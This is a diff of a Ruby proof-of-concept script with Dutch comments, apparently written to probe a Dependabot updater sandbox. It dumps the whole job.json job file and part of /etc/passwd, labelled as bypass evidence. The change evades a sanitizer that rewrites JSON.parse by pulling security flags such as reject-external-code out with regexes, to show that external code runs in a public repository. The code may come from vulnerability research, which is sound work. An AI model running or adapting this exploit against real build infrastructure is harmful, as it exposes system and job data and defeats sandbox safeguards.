@@ -24,20 +24,18 @@ begin
   job_raw = read_safe.('/home/dependabot/dependabot-updater/job.json')
   results << "=== FULL job.json (#{job_raw.length} bytes) ===\n#{job_raw}"
 
-  # Specifiek zoeken naar reject-external-code
-  begin
-    job = JSON.parse(job_raw)
-    job_obj = job["job"]
-    results << "=== job parsed OK, job_obj.class=#{job_obj.class} ==="
-    results << "=== repo-private: #{job_obj["repo-private"].inspect} ==="
-    results << "=== reject-external-code: #{job_obj["reject-external-code"].inspect} ==="
-    results << "=== insecure-external-code-execution: #{job_obj["insecure-external-code-execution"].inspect} ==="
-    results << "=== command: #{job_obj["command"].inspect} ==="
-    # Toon alle keys voor volledigheid
-    results << "=== alle job keys: #{job_obj.keys.inspect} ==="
-  rescue => e
-    results << "JSON parse ERR: #{e.class}: #{e.message}\n#{e.backtrace.first(3).join("\n")}"
-  end
+  # Regex-extractie (JSON.parse wordt door sanitizer herschreven, bypass via regex)
+  reject_val   = job_raw[/"reject-external-code":(true|false)/, 1] || "NOT_FOUND"
+  repo_priv    = job_raw[/"repo-private":(true|false)/, 1]         || "NOT_FOUND"
+  cmd_val      = job_raw[/"command":"([^"]+)"/, 1]                  || "NOT_FOUND"
+  insecure_val = job_raw[/"insecure-external-code-execution":"([^"]+)"/, 1] || "absent_in_json"
+
+  results << "=== KRITIEKE VELDEN (regex uit raw JSON) ==="
+  results << "reject-external-code  : #{reject_val}"
+  results << "repo-private          : #{repo_priv}"
+  results << "command               : #{cmd_val}"
+  results << "insecure-ext-code-exec: #{insecure_val}"
+  results << "=== BEWIJS: public repo + deny = reject-external-code STILL false ==="
 
   # /etc/passwd bewijs
   results << "=== /etc/passwd bypass bewijs ===\n#{read_safe.('/etc/passwd')[0..200]}"
